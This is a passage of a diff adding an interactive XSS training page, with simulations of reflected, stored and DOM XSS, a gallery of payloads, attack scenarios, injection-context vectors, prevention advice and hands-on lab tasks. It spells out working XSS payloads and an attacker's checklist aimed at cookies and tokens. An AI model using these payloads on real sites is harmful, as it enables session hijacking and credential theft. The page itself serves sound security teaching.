+      <div style="background: #040608; border: 1px solid rgba(255,71,87,0.4); border-radius: 6px; padding: 10px 14px; font-family: var(--mono); font-size: 13px; color: var(--red); margin-bottom: 14px;">&lt;script&gt;alert('XSS Attack!')&lt;/script&gt;</div>
+      <div class="input-label">VULNERABLE WEBSITE RENDERS:</div>
+      <div class="terminal">
+        <div class="terminal-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><span style="font-size:11px;color:var(--text3);margin-left:8px;">rendered HTML — DANGEROUS</span></div>
+        <div class="terminal-body">
+          &lt;<span class="t-key">div</span>&gt;<span class="t-danger">&lt;script&gt;alert('XSS Attack!')&lt;/script&gt;</span>&lt;/<span class="t-key">div</span>&gt;
+          <div style="margin-top: 6px; color: var(--text3);">↑ The browser sees &lt;script&gt; and executes it immediately</div>
+        </div>
+      </div>
+      <div style="margin-top: 14px;">
+        <div class="input-label">RESULT IN BROWSER:</div>
+        <div class="sim-browser">
+          <div class="sim-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><div class="sim-url">https://example.com/profile</div></div>
+          <div class="sim-content">
+            <span class="hl-danger">&lt;script&gt;</span><span style="color:var(--red);">alert('XSS Attack!')</span><span class="hl-danger">&lt;/script&gt;</span>
+            <span class="annotation" style="color:var(--red);">⚠ script executes!</span>
+          </div>
+        </div>
+        <button class="btn btn-danger" style="margin-top: 12px;" onclick="simulateAlert('XSS Attack! This is a simulated alert to show how XSS executes.')">▶ Simulate Execution</button>
+      </div>
+    </div>
+
+    <div class="tab-panel" id="s4p2">
+      <div class="input-label">ENTER ANY INPUT:</div>
+      <input type="text" id="s4input" placeholder="Try: &lt;b&gt;bold&lt;/b&gt; or &lt;script&gt;alert(1)&lt;/script&gt;" style="margin-bottom: 12px;">
+      <button class="btn btn-primary" onclick="s4render()">▶ Render Input</button>
+      <div style="margin-top: 14px;" id="s4renderResult" style="display:none;">
+        <div class="input-label">HTML SOURCE:</div>
+        <div class="terminal" id="s4srcBox">
+          <div class="terminal-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div></div>
+          <div class="terminal-body" id="s4srcContent" style="color: var(--text2);">— enter input above —</div>
+        </div>
+        <div style="margin-top: 12px;">
+          <div class="input-label">BROWSER RESULT:</div>
+          <div class="sim-browser">
+            <div class="sim-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><div class="sim-url">https://vulnerable-site.com</div></div>
+            <div class="sim-content" id="s4preview" style="color: var(--text2);">— waiting for input —</div>
+          </div>
+        </div>
+        <div id="s4analysis" style="margin-top: 10px;"></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="nav-buttons">
+    <button class="btn" onclick="prevSection(4)">← What is XSS</button>
+    <button class="btn btn-primary" onclick="nextSection(4)">Next: Types of XSS →</button>
+  </div>
+</div>
+
+<!-- SECTION 5: TYPES -->
+<div class="section" id="section-5">
+  <div class="section-header">
+    <div class="section-num">05 / 10</div>
+    <div><div class="section-title">Types of XSS</div><div class="section-desc">Three distinct attack vectors</div></div>
+  </div>
+
+  <div class="tabs" id="s5tabs">
+    <div class="tab active" onclick="s5tab(0)">Reflected XSS</div>
+    <div class="tab" onclick="s5tab(1)">Stored XSS</div>
+    <div class="tab" onclick="s5tab(2)">DOM-based XSS</div>
+  </div>
+
+  <!-- REFLECTED -->
+  <div class="tab-panel active" id="s5p0">
+    <div class="card card-amber">
+      <div class="card-title amber">REFLECTED XSS — "ONE-TIME MIRROR"</div>
+      <div class="split">
+        <div>
+          <p style="font-size: 14px; margin-bottom: 12px;">The malicious input comes from the <strong>URL</strong>, gets processed by the server, and is reflected back in the response. Not stored — victim must click the crafted URL.</p>
+          <div class="flow" style="flex-direction: column; gap: 6px;">
+            <div class="flow-box" style="width: 100%;">Attacker crafts malicious URL</div>
+            <div class="flow-arrow" style="transform: rotate(90deg);">↓</div>
+            <div class="flow-box" style="width: 100%;">Victim clicks the link</div>
+            <div class="flow-arrow" style="transform: rotate(90deg);">↓</div>
+            <div class="flow-box" style="width: 100%;">Server reflects input in response</div>
+            <div class="flow-arrow" style="transform: rotate(90deg);">↓</div>
+            <div class="flow-box highlight" style="width: 100%;">Browser executes script</div>
+          </div>
+        </div>
+        <div>
+          <div class="card-title blue" style="margin-bottom: 12px;">SIMULATION</div>
+          <div class="input-label">URL PARAMETER:</div>
+          <input type="text" id="reflectedInput" value="&lt;script&gt;alert('Reflected XSS')&lt;/script&gt;" style="margin-bottom: 10px;">
+          <div class="sim-browser">
+            <div class="sim-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><div class="sim-url" id="reflectedUrl" style="font-size:9px;">example.com/search?q=...</div></div>
+            <div class="sim-content">
+              <div style="font-size: 12px; color: var(--text3); margin-bottom: 8px;">Search results for:</div>
+              <div id="reflectedOutput" style="font-family: var(--mono); font-size: 13px; color: var(--amber);">&lt;script&gt;alert('Reflected XSS')&lt;/script&gt;</div>
+            </div>
+          </div>
+          <div class="btn-row">
+            <button class="btn btn-danger" onclick="runReflected()">▶ Execute Payload</button>
+            <button class="btn" onclick="clearReflected()">Reset</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- STORED -->
+  <div class="tab-panel" id="s5p1">
+    <div class="card card-red">
+      <div class="card-title red">STORED XSS — "PERSISTENT BOMB"</div>
+      <div class="split">
+        <div>
+          <p style="font-size: 14px; margin-bottom: 12px;">The malicious script is <strong>saved to the database</strong> and executed for every user who views the page. One attack affects all visitors.</p>
+          <div class="flow" style="flex-direction: column; gap: 6px;">
+            <div class="flow-box" style="width: 100%;">Attacker submits malicious comment</div>
+            <div class="flow-arrow" style="transform: rotate(90deg);">↓</div>
+            <div class="flow-box highlight" style="width: 100%;">Stored in database</div>
+            <div class="flow-arrow" style="transform: rotate(90deg);">↓</div>
+            <div class="flow-box" style="width: 100%;">Any user visits the page</div>
+            <div class="flow-arrow" style="transform: rotate(90deg);">↓</div>
+            <div class="flow-box highlight" style="width: 100%;">Script executes for EVERY visitor</div>
+          </div>
+        </div>
+        <div>
+          <div class="card-title blue" style="margin-bottom: 12px;">COMMENT SECTION SIMULATION</div>
+          <div id="storedComments">
+            <div class="comment-item"><div class="comment-author">alice · 2 min ago</div>Great article, thanks!</div>
+            <div class="comment-item"><div class="comment-author">bob · 5 min ago</div>Very informative post.</div>
+          </div>
+          <div style="margin-top: 12px;">
+            <div class="input-label">POST A COMMENT:</div>
+            <textarea id="storedInput" placeholder="Type your comment... Try: &lt;script&gt;alert('Stored XSS')&lt;/script&gt;" style="height:70px; margin-bottom: 8px;"></textarea>
+            <button class="btn btn-danger" onclick="postStoredXSS()">Post Comment</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- DOM -->
+  <div class="tab-panel" id="s5p2">
+    <div class="card card-blue">
+      <div class="card-title blue">DOM-BASED XSS — "CLIENT-SIDE INJECTION"</div>
+      <div class="split">
+        <div>
+          <p style="font-size: 14px; margin-bottom: 12px;">The attack <strong>never touches the server</strong>. JavaScript in the page reads from the URL and writes it directly into the DOM. No server-side interaction needed.</p>
+          <div class="terminal">
+            <div class="terminal-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><span style="font-size:11px;color:var(--text3);margin-left:8px;">vulnerable JS code</span></div>
+            <div class="terminal-body">
+              <div class="t-comment">// VULNERABLE — reads URL and writes to DOM</div>
+              <div><span class="t-key">var</span> name = location.<span class="t-danger">hash</span>.substring(1);</div>
+              <div>document.<span class="t-danger">write</span>(<span class="t-str">'Hello, '</span> + name);</div>
+              <div style="height:8px"></div>
+              <div class="t-comment">// Attacker URL:</div>
+              <div class="t-danger">example.com/#&lt;img src=x onerror=alert(1)&gt;</div>
+            </div>
+          </div>
+        </div>
+        <div>
+          <div class="card-title blue" style="margin-bottom: 12px;">SIMULATION</div>
+          <div class="input-label">HASH PARAMETER (#):</div>
+          <input type="text" id="domInput" value="&lt;img src=x onerror=alert('DOM XSS')&gt;" style="margin-bottom: 10px;">
+          <div class="sim-browser">
+            <div class="sim-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><div class="sim-url" id="domUrl" style="font-size:9px;">example.com/#...</div></div>
+            <div class="sim-content">
+              <div style="font-size: 12px; color: var(--text3); margin-bottom: 8px;">Hello,</div>
+              <div id="domOutput" style="font-family: var(--mono); font-size: 13px; color: var(--accent2);">&lt;img src=x onerror=alert('DOM XSS')&gt;</div>
+            </div>
+          </div>
+          <button class="btn btn-danger" style="margin-top: 10px;" onclick="runDomXSS()">▶ Execute DOM XSS</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top: 20px;">
+    <div class="card-title accent">COMPARISON</div>
+    <table class="prev-table" style="font-size: 13px;">
+      <thead><tr><th>TYPE</th><th>WHERE INPUT GOES</th><th>WHO IS AFFECTED</th><th>PERSISTENCE</th></tr></thead>
+      <tbody>
+        <tr><td><span class="badge badge-amber">Reflected</span></td><td>URL → server → response</td><td>Victim who clicks link</td><td>None</td></tr>
+        <tr><td><span class="badge badge-red">Stored</span></td><td>Database</td><td>All visitors</td><td>Permanent</td></tr>
+        <tr><td><span class="badge badge-blue">DOM-based</span></td><td>URL → client JS</td><td>Victim who visits URL</td><td>None</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="nav-buttons">
+    <button class="btn" onclick="prevSection(5)">← How XSS Happens</button>
+    <button class="btn btn-primary" onclick="nextSection(5)">Next: Payload Execution →</button>
+  </div>
+</div>
+
+<!-- SECTION 6: PAYLOAD EXECUTION -->
+<div class="section" id="section-6">
+  <div class="section-header">
+    <div class="section-num">06 / 10</div>
+    <div><div class="section-title">XSS Payload Execution</div><div class="section-desc">How different payloads trigger JavaScript</div></div>
+  </div>
+
+  <div class="callout">
+    Attackers have many ways to inject and execute JavaScript. The <code>&lt;script&gt;</code> tag is just the most obvious — there are many more.
+  </div>
+
+  <div class="card">
+    <div class="card-title accent">LIVE PAYLOAD EXECUTOR</div>
+    <p style="font-size: 13px; color: var(--text2); margin-bottom: 16px;">Select a payload to understand how it works, then simulate execution:</p>
+
+    <div class="grid3" style="gap: 10px; margin-bottom: 20px;" id="payloadCards">
+      <div class="card" style="cursor:pointer; padding:14px;" onclick="selectPayload(0)" id="pc0">
+        <div style="font-family:var(--mono);font-size:11px;color:var(--accent);margin-bottom:6px;">SCRIPT TAG</div>
+        <div style="font-family:var(--mono);font-size:12px;color:var(--red);">&lt;script&gt;alert(1)&lt;/script&gt;</div>
+      </div>
+      <div class="card" style="cursor:pointer; padding:14px;" onclick="selectPayload(1)" id="pc1">
+        <div style="font-family:var(--mono);font-size:11px;color:var(--accent);margin-bottom:6px;">IMG onerror</div>
+        <div style="font-family:var(--mono);font-size:12px;color:var(--red);">&lt;img src=x onerror=alert(1)&gt;</div>
+      </div>
+      <div class="card" style="cursor:pointer; padding:14px;" onclick="selectPayload(2)" id="pc2">
+        <div style="font-family:var(--mono);font-size:11px;color:var(--accent);margin-bottom:6px;">onmouseover</div>
+        <div style="font-family:var(--mono);font-size:12px;color:var(--red);">&lt;div onmouseover=alert(1)&gt;hover&lt;/div&gt;</div>
+      </div>
+      <div class="card" style="cursor:pointer; padding:14px;" onclick="selectPayload(3)" id="pc3">
+        <div style="font-family:var(--mono);font-size:11px;color:var(--accent);margin-bottom:6px;">SVG PAYLOAD</div>
+        <div style="font-family:var(--mono);font-size:12px;color:var(--red);">&lt;svg onload=alert(1)&gt;&lt;/svg&gt;</div>
+      </div>
+      <div class="card" style="cursor:pointer; padding:14px;" onclick="selectPayload(4)" id="pc4">
+        <div style="font-family:var(--mono);font-size:11px;color:var(--accent);margin-bottom:6px;">COOKIE THEFT</div>
+        <div style="font-family:var(--mono);font-size:12px;color:var(--red);">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>
+      </div>
+      <div class="card" style="cursor:pointer; padding:14px;" onclick="selectPayload(5)" id="pc5">
+        <div style="font-family:var(--mono);font-size:11px;color:var(--accent);margin-bottom:6px;">IFRAME INJECT</div>
+        <div style="font-family:var(--mono);font-size:12px;color:var(--red);">&lt;iframe src="javascript:alert(1)"&gt;</div>
+      </div>
+    </div>
+
+    <div class="card card-red" id="payloadDetail" style="margin-top: 0;">
+      <div class="split">
+        <div>
+          <div class="card-title red" id="pDetailTitle">SCRIPT TAG</div>
+          <div style="font-family: var(--mono); font-size: 12px; color: var(--red); background: #040608; border-radius: 6px; padding: 10px; margin-bottom: 12px;" id="pDetailCode">&lt;script&gt;alert(1)&lt;/script&gt;</div>
+          <div style="font-size: 13px; color: var(--text2);" id="pDetailDesc">The most basic XSS payload. The browser sees the &lt;script&gt; tag and immediately executes the JavaScript inside it. This works when the input is reflected inside HTML body content.</div>
+        </div>
+        <div>
+          <div class="card-title blue" style="margin-bottom: 10px;">HOW IT WORKS</div>
+          <div style="font-size: 13px; color: var(--text2);" id="pDetailHow">
+            <div style="margin-bottom: 6px;">1. Attacker injects <code style="color: var(--red);">&lt;script&gt;</code> into input</div>
+            <div style="margin-bottom: 6px;">2. Server stores/reflects without encoding</div>
+            <div style="margin-bottom: 6px;">3. Browser parses HTML, finds script tag</div>
+            <div>4. JavaScript executes in page context</div>
+          </div>
+          <button class="btn btn-danger" style="margin-top: 14px;" id="pExecBtn" onclick="execSelectedPayload()">▶ Execute Payload</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="nav-buttons">
+    <button class="btn" onclick="prevSection(6)">← Types of XSS</button>
+    <button class="btn btn-primary" onclick="nextSection(6)">Next: Attack Scenarios →</button>
+  </div>
+</div>
+
+<!-- SECTION 7: ATTACK SCENARIOS -->
+<div class="section" id="section-7">
+  <div class="section-header">
+    <div class="section-num">07 / 10</div>
+    <div><div class="section-title">Real-World Attack Scenarios</div><div class="section-desc">What attackers actually do with XSS</div></div>
+  </div>
+
+  <div class="callout callout-red">
+    XSS is not just about showing popups. In real attacks, JavaScript is used to steal credentials, hijack sessions, and take complete control of a victim's browser.
+  </div>
+
+  <div class="grid3" style="margin: 24px 0;">
+    <div class="card card-red" style="cursor: pointer;" onclick="showScenario('cookie')">
+      <div class="card-title red">SCENARIO 1</div>
+      <div style="font-size: 20px; margin-bottom: 8px;">🍪</div>
+      <div style="font-weight: 600; margin-bottom: 6px;">Cookie Theft</div>
+      <div style="font-size: 13px; color: var(--text2);">Steal session cookie → log in as victim</div>
+      <div class="badge badge-red" style="margin-top: 10px;">CRITICAL</div>
+    </div>
+    <div class="card card-amber" style="cursor: pointer;" onclick="showScenario('session')">
+      <div class="card-title amber">SCENARIO 2</div>
+      <div style="font-size: 20px; margin-bottom: 8px;">🔑</div>
+      <div style="font-weight: 600; margin-bottom: 6px;">Session Hijacking</div>
+      <div style="font-size: 13px; color: var(--text2);">Capture auth token → full account access</div>
+      <div class="badge badge-amber" style="margin-top: 10px;">HIGH</div>
+    </div>
+    <div class="card card-red" style="cursor: pointer;" onclick="showScenario('phishing')">
+      <div class="card-title red">SCENARIO 3</div>
+      <div style="font-size: 20px; margin-bottom: 8px;">🎭</div>
+      <div style="font-weight: 600; margin-bottom: 6px;">Fake Login Form</div>
+      <div style="font-size: 13px; color: var(--text2);">Replace login form → steal credentials</div>
+      <div class="badge badge-red" style="margin-top: 10px;">CRITICAL</div>
+    </div>
+    <div class="card card-amber" style="cursor: pointer;" onclick="showScenario('defacement')">
+      <div class="card-title amber">SCENARIO 4</div>
+      <div style="font-size: 20px; margin-bottom: 8px;">🖊️</div>
+      <div style="font-weight: 600; margin-bottom: 6px;">Defacement</div>
+      <div style="font-size: 13px; color: var(--text2);">Replace page content with attacker content</div>
+      <div class="badge badge-amber" style="margin-top: 10px;">MEDIUM</div>
+    </div>
+    <div class="card card-red" style="cursor: pointer;" onclick="showScenario('keylogger')">
+      <div class="card-title red">SCENARIO 5</div>
+      <div style="font-size: 20px; margin-bottom: 8px;">⌨️</div>
+      <div style="font-weight: 600; margin-bottom: 6px;">Keylogger</div>
+      <div style="font-size: 13px; color: var(--text2);">Capture every keystroke silently</div>
+      <div class="badge badge-red" style="margin-top: 10px;">CRITICAL</div>
+    </div>
+    <div class="card" style="cursor: pointer;" onclick="showScenario('redirect')">
+      <div class="card-title accent">SCENARIO 6</div>
+      <div style="font-size: 20px; margin-bottom: 8px;">↪️</div>
+      <div style="font-weight: 600; margin-bottom: 6px;">Redirect</div>
+      <div style="font-size: 13px; color: var(--text2);">Redirect user to phishing site</div>
+      <div class="badge badge-accent" style="margin-top: 10px;">MEDIUM</div>
+    </div>
+  </div>
+
+  <div class="card card-red" id="scenarioDetail" style="display: none;">
+    <div class="card-title red" id="scenTitle"></div>
+    <div class="split">
+      <div>
+        <div id="scenDesc"></div>
+        <div class="terminal" style="margin-top: 14px;" id="scenTerminal">
+          <div class="terminal-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><span style="font-size:11px;color:var(--text3);margin-left:8px;">attack payload</span></div>
+          <div class="terminal-body" id="scenCode"></div>
+        </div>
+      </div>
+      <div id="scenImpact"></div>
+    </div>
+    <button class="btn btn-danger" id="scenExecBtn" style="margin-top: 14px;" onclick="execScenario()">▶ Simulate Attack</button>
+    <div id="scenOutput" style="margin-top: 12px; display: none;"></div>
+  </div>
+
+  <!-- ATTACKER MINDSET -->
+  <div style="margin-top: 30px;">
+    <div style="font-family: var(--mono); font-size: 11px; color: var(--text3); letter-spacing: 0.1em; margin-bottom: 16px;">ATTACKER MINDSET</div>
+    <div class="mindset-item">
+      <div class="mindset-icon">🔍</div>
+      <div><div class="mindset-q">"Where is user input reflected?"</div><div class="mindset-a">Look for search boxes, comment fields, URL parameters, profile fields — anywhere input is displayed back.</div></div>
+    </div>
+    <div class="mindset-item">
+      <div class="mindset-icon">💉</div>
+      <div><div class="mindset-q">"Can I inject a script tag?"</div><div class="mindset-a">Test with <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. If a popup fires, the site is vulnerable.</div></div>
+    </div>
+    <div class="mindset-item">
+      <div class="mindset-icon">🏃</div>
+      <div><div class="mindset-q">"Will the browser execute it?"</div><div class="mindset-a">If the server doesn't encode HTML, the browser will treat injected tags as real code.</div></div>
+    </div>
+    <div class="mindset-item">
+      <div class="mindset-icon">💰</div>
+      <div><div class="mindset-q">"What data can I steal?"</div><div class="mindset-a">document.cookie for session tokens. localStorage for auth data. keystrokes from forms.</div></div>
+    </div>
+  </div>
+
+  <div class="nav-buttons">
+    <button class="btn" onclick="prevSection(7)">← Payloads</button>
+    <button class="btn btn-primary" onclick="nextSection(7)">Next: Detection →</button>
+  </div>
+</div>
+
+<!-- SECTION 8: DETECTION -->
+<div class="section" id="section-8">
+  <div class="section-header">
+    <div class="section-num">08 / 10</div>
+    <div><div class="section-title">Detection</div><div class="section-desc">Finding XSS vulnerabilities</div></div>
+  </div>
+
+  <div class="callout">
+    Detection means finding where user input gets reflected unsafely. The key questions: Is the input echoed back? Is it inside an HTML attribute? Is it handled by JavaScript?
+  </div>
+
+  <div class="card">
+    <div class="card-title accent">VULNERABILITY SCANNER SIMULATION</div>
+    <p style="font-size: 13px; color: var(--text2); margin-bottom: 14px;">Enter a test payload and see how a scanner identifies vulnerable injection points:</p>
+    <div class="input-label">TEST PAYLOAD:</div>
+    <input type="text" id="scanInput" placeholder="Enter payload (e.g. &lt;script&gt;alert(1)&lt;/script&gt; or &lt;img src=x onerror=alert(1)&gt;)" style="margin-bottom: 10px;" value="&lt;script&gt;alert(1)&lt;/script&gt;">
+    <button class="btn btn-primary" onclick="runScan()">▶ Scan for XSS</button>
+    <div class="scan-result" id="scanResult" style="display: none;">
+      <div class="scan-line"><span style="color: var(--text3);">[*]</span> <span class="scan-info">Starting XSS scan...</span></div>
+      <div id="scanLines"></div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top: 20px;">
+    <div class="card-title blue">INJECTION CONTEXT MATTERS</div>
+    <div style="font-size: 13px; color: var(--text2); margin-bottom: 14px;">Where your input lands in HTML determines which payload to use:</div>
+    <table class="prev-table">
+      <thead><tr><th>CONTEXT</th><th>EXAMPLE</th><th>ATTACK VECTOR</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>HTML body</td>
+          <td><code style="font-size:12px;color:var(--text2);">&lt;p&gt;INPUT&lt;/p&gt;</code></td>
+          <td><span class="hl-danger">&lt;script&gt;...&lt;/script&gt;</span></td>
+        </tr>
+        <tr>
+          <td>HTML attribute</td>
+          <td><code style="font-size:12px;color:var(--text2);">&lt;input value="INPUT"&gt;</code></td>
+          <td><span class="hl-danger">" onmouseover="alert(1)</span></td>
+        </tr>
+        <tr>
+          <td>JavaScript variable</td>
+          <td><code style="font-size:12px;color:var(--text2);">var x = 'INPUT';</code></td>
+          <td><span class="hl-danger">'; alert(1); //</span></td>
+        </tr>
+        <tr>
+          <td>URL parameter</td>
+          <td><code style="font-size:12px;color:var(--text2);">?name=INPUT</code></td>
+          <td><span class="hl-danger">javascript:alert(1)</span></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="nav-buttons">
+    <button class="btn" onclick="prevSection(8)">← Attack Scenarios</button>
+    <button class="btn btn-primary" onclick="nextSection(8)">Next: Prevention →</button>
+  </div>
+</div>
+
+<!-- SECTION 9: PREVENTION -->
+<div class="section" id="section-9">
+  <div class="section-header">
+    <div class="section-num">09 / 10</div>
+    <div><div class="section-title">Prevention</div><div class="section-desc">Stopping XSS at every layer</div></div>
+  </div>
+
+  <div class="callout">
+    <strong>Golden Rule:</strong> "User input must <em>never</em> be executed as code." Treat all user input as untrusted data — encode it before displaying.
+  </div>
+
+  <div class="card" style="margin: 24px 0;">
+    <div class="card-title red" style="margin-bottom: 12px;">❌ VULNERABLE CODE</div>
+    <div class="terminal">
+      <div class="terminal-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><span style="font-size:11px;color:var(--text3);margin-left:8px;">JavaScript — UNSAFE</span></div>
+      <div class="terminal-body">
+        <div class="t-comment">// DANGEROUS: directly writing user input to DOM</div>
+        <div><span class="t-danger">element.innerHTML</span> = userInput; <span class="t-comment">// ← XSS possible!</span></div>
+        <div style="height:8px"></div>
+        <div class="t-comment">// Input: &lt;script&gt;alert('hacked')&lt;/script&gt;</div>
+        <div class="t-danger">// Result: script EXECUTES</div>
+      </div>
+    </div>
+    <div class="card-title green" style="margin-top: 16px; margin-bottom: 12px;">✓ SECURE CODE</div>
+    <div class="terminal">
+      <div class="terminal-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><span style="font-size:11px;color:var(--text3);margin-left:8px;">JavaScript — SAFE</span></div>
+      <div class="terminal-body">
+        <div class="t-comment">// SAFE: textContent never executes HTML</div>
+        <div><span class="t-ok">element.textContent</span> = userInput; <span class="t-comment">// ← XSS blocked</span></div>
+        <div style="height:8px"></div>
+        <div class="t-comment">// Input: &lt;script&gt;alert('hacked')&lt;/script&gt;</div>
+        <div class="t-ok">// Result: shown as literal text ✓</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-bottom: 20px;">
+    <div class="card-title accent">LIVE COMPARISON: innerHTML vs textContent</div>
+    <div class="input-label">ENTER HTML PAYLOAD:</div>
+    <input type="text" id="prevInput" value="&lt;img src=x onerror=alert('XSS')&gt; Hello World" style="margin-bottom: 12px;">
+    <div class="split">
+      <div>
+        <div style="font-family: var(--mono); font-size: 11px; color: var(--red); margin-bottom: 8px;">❌ innerHTML (VULNERABLE)</div>
+        <div class="sim-browser">
+          <div class="sim-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><div class="sim-url">vulnerable-site.com</div></div>
+          <div class="sim-content" id="innerHtmlDemo" style="font-size: 14px; min-height: 60px;">— enter input above —</div>
+        </div>
+      </div>
+      <div>
+        <div style="font-family: var(--mono); font-size: 11px; color: var(--green); margin-bottom: 8px;">✓ textContent (SAFE)</div>
+        <div class="sim-browser">
+          <div class="sim-bar"><div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div><div class="sim-url">secure-site.com</div></div>
+          <div class="sim-content" id="textContentDemo" style="font-size: 14px; font-family: var(--mono); color: var(--green); min-height: 60px; word-break: break-all;">— enter input above —</div>
+        </div>
+      </div>
+    </div>
+    <button class="btn btn-primary" style="margin-top: 12px;" onclick="runPrevComparison()">▶ Compare Both</button>
+  </div>
+
+  <div class="grid3">
+    <div class="card card-accent">
+      <div class="card-title accent">OUTPUT ENCODING</div>
+      <p style="font-size: 13px; color: var(--text2);">Convert special characters to HTML entities. <code>&lt;</code> becomes <code>&amp;lt;</code> — browser shows it as text, never executes it.</p>
+      <div style="font-family: var(--mono); font-size: 11px; margin-top: 10px; color: var(--accent);">textContent, encodeHTML()</div>
+    </div>
+    <div class="card card-green">
+      <div class="card-title green">INPUT VALIDATION</div>
+      <p style="font-size: 13px; color: var(--text2);">Reject input that doesn't match expected format. A phone number field should only accept digits — reject anything else.</p>
+      <div style="font-family: var(--mono); font-size: 11px; margin-top: 10px; color: var(--green);">allowlist validation</div>
+    </div>
+    <div class="card card-blue">
+      <div class="card-title blue">CONTENT SECURITY POLICY</div>
+      <p style="font-size: 13px; color: var(--text2);">HTTP header that tells the browser which scripts are allowed to run. Injected scripts from unknown sources get blocked.</p>
+      <div style="font-family: var(--mono); font-size: 11px; margin-top: 10px; color: var(--accent2);">Content-Security-Policy header</div>
+    </div>
+    <div class="card card-amber">
+      <div class="card-title amber">HTTPOnly COOKIES</div>
+      <p style="font-size: 13px; color: var(--text2);">Setting cookies as HTTPOnly prevents JavaScript from reading them. Even if XSS fires, it cannot steal the session cookie.</p>
+      <div style="font-family: var(--mono); font-size: 11px; margin-top: 10px; color: var(--amber);">Set-Cookie: session=x; HttpOnly</div>
+    </div>
+    <div class="card">
+      <div class="card-title accent">FRAMEWORKS & LIBRARIES</div>
+      <p style="font-size: 13px; color: var(--text2);">React, Vue, Angular all auto-escape output by default. They treat all user data as text, never as HTML — XSS-safe by default.</p>
+      <div style="font-family: var(--mono); font-size: 11px; margin-top: 10px; color: var(--text3);">React JSX, Angular templates</div>
+    </div>
+    <div class="card card-red">
+      <div class="card-title red">AVOID DANGEROUS APIs</div>
+      <p style="font-size: 13px; color: var(--text2);">Never use <code>innerHTML</code>, <code>document.write()</code>, or <code>eval()</code> with user data. These directly execute whatever you give them.</p>
+      <div style="font-family: var(--mono); font-size: 11px; margin-top: 10px; color: var(--red);">use textContent instead</div>
+    </div>
+  </div>
+
+  <div class="nav-buttons">
+    <button class="btn" onclick="prevSection(9)">← Detection</button>
+    <button class="btn btn-primary" onclick="nextSection(9)">Next: Final Lab →</button>
+  </div>
+</div>
+
+<!-- SECTION 10: FINAL LAB -->
+<div class="section" id="section-10">
+  <div class="section-header">
+    <div class="section-num">10 / 10</div>
+    <div><div class="section-title">Final Hands-on Lab</div><div class="section-desc">Apply everything you've learned</div></div>
+  </div>
+
+  <div class="callout callout-amber">
+    Complete 5 tasks to demonstrate your understanding of XSS. Each task requires you to use a specific technique.
+  </div>
+
+  <div class="progress-bar"><div class="progress-fill" id="labProgress" style="width: 0%;"></div></div>
+  <div style="font-family: var(--mono); font-size: 11px; color: var(--text3); margin-bottom: 24px;" id="labProgressText">0 / 5 tasks completed</div>
+
+  <!-- TASK 1 -->
+  <div class="lab-task" id="task1" onclick="">
+    <div class="lab-task-num" id="t1num">01</div>
+    <div class="lab-task-body">
+      <div class="lab-task-title">Trigger an Alert Popup</div>
+      <div class="lab-task-hint">Use the comment box to inject a payload that fires alert(). Hint: try &lt;script&gt;alert('task1')&lt;/script&gt;</div>
+      <div style="margin-top: 12px;">
+        <div class="input-label">COMMENT BOX (VULNERABLE):</div>
+        <input type="text" id="t1input" placeholder="Inject your XSS payload here..." style="margin-bottom: 8px;">
+        <button class="btn btn-danger" onclick="submitTask1()">Submit</button>
+        <div id="t1result" style="margin-top: 8px; font-family: var(--mono); font-size: 12px;"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- TASK 2 -->
+  <div class="lab-task" id="task2">
+    <div class="lab-task-num" id="t2num">02</div>
+    <div class="lab-task-body">
+      <div class="lab-task-title">Perform Reflected XSS</div>
+      <div class="lab-task-hint">Craft a URL with a malicious search parameter. The search box below reflects your input. Use a different payload than task 1.</div>
+      <div style="margin-top: 12px;">
+        <div class="input-label">SEARCH BOX (REFLECTED):</div>
+        <input type="text" id="t2input" placeholder="Search for something... try an event handler payload" style="margin-bottom: 8px;">
+        <button class="btn btn-danger" onclick="submitTask2()">Search</button>
+        <div id="t2result" style="margin-top: 8px; font-family: var(--mono); font-size: 12px;"></div>
+        <div id="t2reflect" style="margin-top: 8px;"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- TASK 3 -->
+  <div class="lab-task" id="task3">
+    <div class="lab-task-num" id="t3num">03</div>
+    <div class="lab-task-body">
+      <div class="lab-task-title">Perform Stored XSS</div>
+      <div class="lab-task-hint">Post a comment that will execute when any user views the page. The comment persists — use alert('stored').</div>
+      <div style="margin-top: 12px;">
+        <div id="task3comments">
+          <div class="comment-item"><div class="comment-author">visitor · just now</div>Nice lab!</div>
+        </div>
+        <div class="input-label" style="margin-top: 10px;">POST COMMENT:</div>
+        <textarea id="t3input" placeholder="Your stored XSS comment..." style="height: 60px; margin-bottom: 8px;"></textarea>
+        <button class="btn btn-danger" onclick="submitTask3()">Post Comment</button>
+        <div id="t3result" style="margin-top: 8px; font-family: var(--mono); font-size: 12px;"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- TASK 4 -->
+  <div class="lab-task" id="task4">
+    <div class="lab-task-num" id="t4num">04</div>
+    <div class="lab-task-body">
+      <div class="lab-task-title">Identify DOM-based XSS</div>
